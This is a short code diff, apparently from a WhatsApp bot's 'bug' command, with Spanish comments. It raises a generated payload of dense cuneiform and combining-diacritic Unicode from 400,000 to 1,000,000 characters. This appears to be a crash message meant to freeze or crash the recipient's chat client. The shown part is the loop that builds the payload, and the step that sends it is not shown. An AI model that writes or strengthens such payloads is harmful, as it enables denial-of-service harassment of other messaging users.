@@ -13,8 +13,8 @@ const bugCommand = {
         const chat = m.key.remoteJid
 
         try {
-            // 1. Generar la carga de 400,000 Unicodes densos
-            let cantidad = 400000
+            // 1. Generar la carga de 1,000000 Unicodes densos
+            let cantidad = 1000000
             let carga = ""
             for (let i = 0; i < cantidad; i++) {
                 // Mezcla de Cuneiforme y diacríticos pesados
